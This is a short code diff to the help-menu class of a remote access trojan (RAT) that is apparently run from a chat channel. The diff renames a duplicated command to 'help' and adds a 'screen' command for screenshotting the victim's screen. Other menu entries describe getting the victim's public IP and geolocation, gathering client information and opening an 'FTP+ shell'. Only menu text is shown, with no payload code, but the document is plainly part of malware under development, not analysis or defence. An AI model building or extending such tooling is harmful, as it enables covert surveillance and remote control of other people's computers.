@@ -11,11 +11,12 @@ class Menu:
     def __init__(self, commands:dict=None) -> None:
         if commands == None:
             self.helpMenu = {
-                "ping": Command("This **help menu**"),
+                "help": Command("This **help menu**"),
                 "ping": Command("See if the RAT is running in this channel\n + Some small **latency info**", (34, 218, 25)),
                 "kill": Command("**Kill** the RAT", (224, 27, 27), ["stop"]),
                 "ip": Command("Get the **public IP** address of the client", (216, 25, 218), ["ipconfig", "ipinfo", "viewip", "showip"]),
                 "info": Command("Get all **information** about the client", (227, 222, 15), ["geolocate", "geolocation", "infomenu"]),
+                "screen": Command("Get a **screenshot** of the clients screen", (227, 222, 15), ["view", "ss", "screenshare", "screenshot"]),
                 "ftp": Command("Get an **FTP+ shell** from the client", (15, 227, 143), ["ftp+", "ftpshell", "shellftp"])
             }
         else:
